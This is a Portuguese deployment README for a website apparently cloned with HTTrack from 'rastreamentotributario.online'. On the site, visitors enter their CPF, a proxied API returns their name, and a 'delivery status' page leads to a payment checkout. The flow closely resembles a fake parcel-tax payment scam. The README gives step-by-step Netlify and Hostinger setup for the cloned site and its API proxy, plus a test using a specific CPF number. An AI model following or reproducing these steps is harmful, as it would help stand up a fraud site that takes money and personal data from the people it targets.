# Deploy do site (Netlify ou Hostinger)

## Estrutura do fluxo

1. **Página 1 – Consulta CPF**  
   `https://seu-dominio.netlify.app/` (ou `/encomenda/` se publicar a raiz)  
   - Lead digita o CPF → chama a API (via Netlify Function) → redireciona para a página 2 com `?cpf=XXX&nome=YYY`.

2. **Página 2 – Status da entrega**  
   `https://seu-dominio.netlify.app/app/index.html?cpf=19517490739&nome=Nome%20Formatado`  
   - Mostra dados da API (nome, CPF, imagem).  
   - CPF e nome na URL são os mesmos da página 1.  
   - Botão **Efetuar Pagamento** → checkout:  
   `https://pagamento.rastreamentotributario.site/checkout?product=98f9df39-b9fb-11f0-a710-46da4690ad53&cpf=195.174.907-39&nome=Nome+Formatado`

3. **API**  
   - A mesma API do site original é usada via **proxy** em `netlify/functions/api.js`, que encaminha para:  
   `https://rastreamentotributario.online/encomenda/api/api.php`

---

## Deploy na Netlify (recomendado)

Funciona tudo: HTML, CSS, JS e a API (via serverless function).

### Opção A – Deploy por GitHub

1. Crie um repositório no GitHub e suba o projeto **inteiro** (incluindo a pasta `rastreamentotributario.online`, a pasta `netlify` e o `netlify.toml` na raiz).
2. No Netlify: **Add new site** → **Import an existing project** → conecte o GitHub e escolha esse repositório.
3. Configuração de build:
   - **Build command:** deixe em branco (ou `echo "No build"`).
   - **Publish directory:** `rastreamentotributario.online/encomenda`
   - As **Functions** são detectadas automaticamente pela pasta `netlify/functions` (conforme `netlify.toml`).
4. Deploy. A URL da página 1 será `https://SEU-SITE.netlify.app/` e a da página 2 `https://SEU-SITE.netlify.app/app/index.html?cpf=...&nome=...`.

### Opção B – Deploy por arrastar pasta (Drag and drop)

- O **Drag and drop** do Netlify publica só arquivos estáticos. **Não executa Netlify Functions.**  
- Por isso, **a API não vai funcionar** se você subir só a pasta `encomenda` por drag and drop.  
- Para a API funcionar, use **Opção A (GitHub)** ou **Netlify CLI** (abaixo).

### Opção C – Netlify CLI

```bash
npm install -g netlify-cli
cd "c:\Os meus Sites\TelaNova"
netlify deploy --prod
```

Quando pedir o “publish directory”, use: `rastreamentotributario.online/encomenda`.  
Assim o Netlify usa o `netlify.toml` e as functions são deployadas.

---

## Deploy na Hostinger

- A Hostinger usa hospedagem compartilhada com suporte a **PHP**.
- Se você tiver **PHP** disponível, pode:
  1. Colocar os arquivos estáticos (HTML, CSS, JS, imagens) na pasta pública (ex.: `public_html` ou `public_html/encomenda`).
  2. Recriar um `api/api.php` na Hostinger que faz **proxy** (curl/file_get_contents) para `https://rastreamentotributario.online/encomenda/api/api.php` e repassa `cpf` e `nome`.
  3. Nos HTMLs, trocar `/.netlify/functions/api` de volta para `api/api.php` (caminho relativo ao seu domínio).
- **Resumo:** na Hostinger você precisaria de um backend em PHP (proxy) para a API; no Netlify isso já está resolvido com a function em `netlify/functions/api.js`.

---

## Teste rápido (CPF 19517490739)

1. Abra a página 1 (formulário de CPF).
2. Digite o CPF: `195.174.907-39` ou `19517490739`.
3. Clique em **Consultar**.
4. Deve abrir a página 2 com a URL contendo `cpf=19517490739` e o nome retornado pela API.
5. Na página 2, o CPF exibido deve ser o mesmo digitado (formatado).
6. **Efetuar Pagamento** deve levar ao checkout com `cpf=195.174.907-39` e o nome no link.

---

## Resumo

| Onde subir   | API funciona?              | Como |
|-------------|----------------------------|------|
| **Netlify (GitHub ou CLI)** | Sim | Netlify Function `api.js` faz proxy para a API original. |
| **Netlify (só drag and drop)** | Não | Não executa functions. |
| **Hostinger** | Só com PHP | Criar `api/api.php` proxy e apontar os HTMLs para ele. |

Recomendação: **deploy na Netlify via GitHub** para ter tudo (site + API) funcionando sem configurar servidor PHP.

---

## Estrutura de arquivos (resumo)

```
TelaNova/
├── netlify.toml
├── netlify/functions/api.js    ← proxy da API original
├── DEPLOY-README.md
└── rastreamentotributario.online/encomenda/
    ├── index.html              ← Página 1 (form CPF)
    ├── app/
    │   └── index.html          ← Página 2 (status + botão pagamento)
    ├── api/
    │   └── api.json            ← (estático; em produção usa a function)
    ├── css/, js/, images/, fonts/
    └── ...
```

Se alguma imagem (ex.: `slide2.jpg`, `NSaEEPeXKrlx.jpg`) não existir em `encomenda/images/`, o HTTrack pode não tê-la baixado. Coloque os arquivos em `encomenda/images/` para evitar 404.
